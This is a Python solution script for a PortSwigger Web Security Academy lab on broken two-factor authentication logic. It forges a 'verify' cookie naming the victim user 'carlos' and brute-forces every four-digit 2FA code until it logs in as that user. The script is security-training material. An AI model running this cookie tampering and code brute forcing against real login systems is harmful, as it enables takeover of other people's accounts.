#!/usr/bin/env python3
# Lab: 2FA broken logic
# Lab-Link: https://portswigger.net/web-security/authentication/multi-factor/lab-2fa-broken-logic
# Difficulty: PRACTITIONER
import requests
import sys
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}


def main():
    print('[+] Lab: 2FA broken logic')
    try:
        host = sys.argv[1].strip().rstrip('/')
    except IndexError:
        print(f'Usage: {sys.argv[0]} <HOST>')
        print(f'Exampe: {sys.argv[0]} http://www.example.com')
        sys.exit(-1)

    with requests.Session() as client:
        client.verify = False
        client.proxies = proxies

        # get a valid session token
        client.get(f'{host}/login')
        # session_id = client.cookies.get('session', domain=f'{host[8:]}')

        # Generate a 2FA token for carlos
        client.cookies.set('verify', 'carlos', domain=f'{host[8:]}')
        client.get(f'{host}/login2')

        # Now brute force the 2FA token
        for i in range(0, 10000):
            print(f'[ ] Trying to brute force 2FA code: {i:04}', end='\r')
            data = {'mfa-code': f'{i:04}'}
            r = client.post(f'{host}/login2', data, allow_redirects=True)
            if "Your username is: carlos" in r.text:
                print()
                print(f'[+] Login to user carlos successful, lab solved')
                sys.exit(0)
        print(f'[-] Login to user carlos not successful')


if __name__ == "__main__":
    main()
